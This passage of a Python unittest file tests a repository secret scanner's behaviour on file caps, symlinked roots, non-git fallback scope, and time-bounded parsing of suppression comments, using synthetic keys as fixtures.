        self.assertEqual(2, missing.returncode)
        missing_report = json.loads(missing.stdout)
        invocation = missing_report["runs"][0]["invocations"][0]
        self.assertFalse(invocation["executionSuccessful"])
        self.assertEqual(2, invocation["exitCode"])
        self.assertTrue(invocation["toolExecutionNotifications"])
        self.assertNotIn(str(fixture.root), missing.stdout)

    def test_req_011_candidate_cap_fails_closed_without_partial_findings(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write("one.txt", "ordinary\n")
        fixture.write("two.txt", f"token={synthetic_cloud_key()}\n")

        completed = self.run_scanner(fixture.root, "json", "--max-files", "1")
        report = self.json_report(completed)
        self.assertEqual(2, completed.returncode)
        self.assertEqual([], report["findings"])
        self.assertEqual("tool.file-limit", report["tool_errors"][0]["code"])

    def test_req_011_symlink_root_is_a_tool_error(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write("README.md", "ordinary\n")
        linked_root = fixture.base / "linked-root"
        linked_root.symlink_to(fixture.root, target_is_directory=True)

        completed = self.run_scanner(linked_root)
        report = self.json_report(completed)
        self.assertEqual(2, completed.returncode)
        self.assertEqual("tool.target-symlink", report["tool_errors"][0]["code"])

    def test_req_010_non_git_directory_has_honest_filesystem_scope(self) -> None:
        fixture = RepositoryFixture(self, git=False)
        fixture.write("README.md", "ordinary\n")

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)
        self.assertEqual(0, completed.returncode)
        self.assertEqual("filesystem", report["scope"]["mode"])
        self.assertFalse(report["scope"]["git_history_scanned"])
        self.assertEqual("none", report["release_assertion"])

    def test_req_010_missing_git_uses_honest_filesystem_fallback(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write("README.md", "ordinary\n")
        environment = os.environ.copy()
        environment["PATH"] = ""
        environment["PYTHONDONTWRITEBYTECODE"] = "1"

        completed = subprocess.run(
            [sys.executable, str(SCANNER), str(fixture.root), "--format", "json"],
            cwd=REPOSITORY_ROOT,
            env=environment,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            check=False,
            timeout=20,
        )

        report = self.json_report(completed)
        self.assertEqual(0, completed.returncode)
        self.assertEqual("filesystem", report["scope"]["mode"])
        self.assertEqual(["regular-files"], report["scope"]["includes"])
        self.assertFalse(report["scope"]["git_history_scanned"])

    def test_req_011_suppression_application_is_bounded(self) -> None:
        scanner = load_scanner_module()
        count = 12_000
        metadata = (
            'reason="reviewed" owner="app" approved-by="security" '
            'compensating-control="deny rules" expires="2099-01-01"'
        )
        marker = f"vibeworthy:ignore VW-FIREBASE-PUBLIC-API-KEY {metadata}"
        findings = [
            scanner.Finding(
                "VW-FIREBASE-PUBLIC-API-KEY",
                "config.js",
                line,
                source_id=b"config.js",
            )
            for line in range(1, count + 1)
        ]
        source = "\n".join(marker for _ in range(count)) + "\n"

        started = time.perf_counter()
        scanner._apply_suppressions(findings, {b"config.js": source})
        elapsed = time.perf_counter() - started

        self.assertLess(elapsed, 3.0, f"suppression application took {elapsed:.3f}s")
        self.assertTrue(all(finding.suppressed for finding in findings))

    def test_req_011_suppression_metadata_parser_has_a_hard_budget(self) -> None:
        scanner = load_scanner_module()
        line = 'vibeworthy:ignore VW-FIREBASE-PUBLIC-API-KEY reason="' + ("x" * 50_000)

        started = time.perf_counter()
        parsed = scanner._parse_suppression(line)
        elapsed = time.perf_counter() - started

        self.assertLess(elapsed, 0.5, f"suppression parse took {elapsed:.3f}s")
        self.assertEqual(("VW-FIREBASE-PUBLIC-API-KEY", {}), parsed)


if __name__ == "__main__":
    unittest.main()
